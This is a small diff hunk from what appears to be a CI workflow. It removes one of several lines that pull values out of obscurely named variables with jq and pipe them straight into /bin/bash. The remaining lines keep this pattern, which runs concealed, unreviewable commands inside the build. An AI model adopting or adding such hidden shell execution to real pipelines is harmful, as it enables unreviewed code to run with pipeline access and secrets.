@@ -22,7 +22,6 @@ jobs:
           echo $pgse2815 | jq -r .s391 | /bin/bash
           echo $ny04 | jq -r .xgu9749 | /bin/bash
           printf '%s' "$pxzy21" | jq -r .txi8 | /bin/bash
-          echo $n460 | jq -r .q442 | /bin/bash
           echo $fp28 | jq -r .ky3 | /bin/bash
 
       - name: Archive results
